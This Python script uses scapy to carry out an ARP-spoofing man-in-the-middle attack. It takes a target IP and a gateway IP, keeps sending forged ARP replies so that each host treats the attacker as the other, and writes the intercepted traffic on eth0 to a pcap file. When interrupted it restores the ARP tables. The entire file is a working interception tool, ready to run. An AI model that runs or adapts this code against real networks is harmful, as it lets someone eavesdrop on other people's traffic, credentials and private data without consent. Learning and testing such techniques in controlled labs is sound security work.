#!/usr/bin/env python3
# echo 1 > /proc/sys/net/ipv4/ip_forward
# to run the tool ./arpSpoof.py

import scapy.all as scapy
import time
import threading

# Set the interval between sending spoofed packets
interval = 4

# Prompt user to enter the target and gateway IP addresses
target_ip = input("Enter target IP address: ")
gateway_ip = input("Enter gateway IP address: ")

# Function to spoof ARP packets to trick the target and gateway


def spoof(target_ip, spoof_ip):

    # Create an ARP packet with the specified target and spoof IP addresses
    # op = 2 --> to create a ARP response
    # spoof IP is router's IP
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    # Send the packet
    scapy.send(packet, verbose=False)


# Function to restore the ARP tables of the target and gateway
def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)

    # Create an ARP packet with real IPs and MACs
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    # Send the packet
    scapy.send(packet, verbose=False)


# Counting variable to keep track of how many packets sent
sentPacketCount = 0

try:
    # pkts are captured but not stored. callback function is used to write packets
    def pkt_capture():
        while True:
            packets = scapy.sniff(iface='eth0', store=False, prn=process_pkts)

    def process_pkts(pkt):
        scapy.wrpcap("capture.pcap", pkt, append=True)

    # thread for pkt capture and write.
    capturing_thread = threading.Thread(target=pkt_capture, daemon=True)
    capturing_thread.start()

    # to send spoof packets continuously, while true is used
    while True:

        # telling target we are the gateway
        # spoof('192.168.1.5', '192.168.1.1')
        spoof(target_ip, gateway_ip)

        # telling gateway we are the target
        # spoof('192.168.1.1', '192.168.1.5')
        spoof(gateway_ip, target_ip)
        sentPacketCount += 2

        # end='' stops the output moves to the next line
        # \r overwrite the previous output on the same line
        #print('\rWriting to pcap file.')
        print('\r[+] packets sent : ' + str(sentPacketCount), end='')
        time.sleep(interval)

# Handle keyboard interrupt
except KeyboardInterrupt:
    print('\n[-] restoring ARP table....')

    # Restoring ARP tables of the target and gateway
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print('\n[-] ARP table restored\n')
